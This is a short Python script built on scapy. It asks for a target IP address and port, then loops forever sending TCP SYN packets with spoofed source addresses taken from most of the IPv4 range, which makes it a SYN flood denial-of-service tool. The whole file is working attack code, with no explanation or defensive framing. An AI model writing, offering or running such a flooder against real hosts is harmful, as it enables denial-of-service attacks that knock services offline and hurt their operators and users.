from scapy.all import IP, TCP, send

target_host = input("Enter Target IP: ")
target_port = int(input("Enter Target Port: "))
while True:
    for a in range(10,256):
        for b in range(0,256):
            for c in range(0,256):
                for d in range(0,256):
                    source_ip= f"{a}.{b}.{c}.{d}"
                    ip_packet = IP(src=source_ip, dst=target_host)
                    tcp_packet = TCP(dport=target_port, flags='S')
                    syn_packet = ip_packet / tcp_packet
                    send(syn_packet)
                    print(f"SYN packet with spoofed source IP {source_ip} sent to {target_host}:{target_port}")
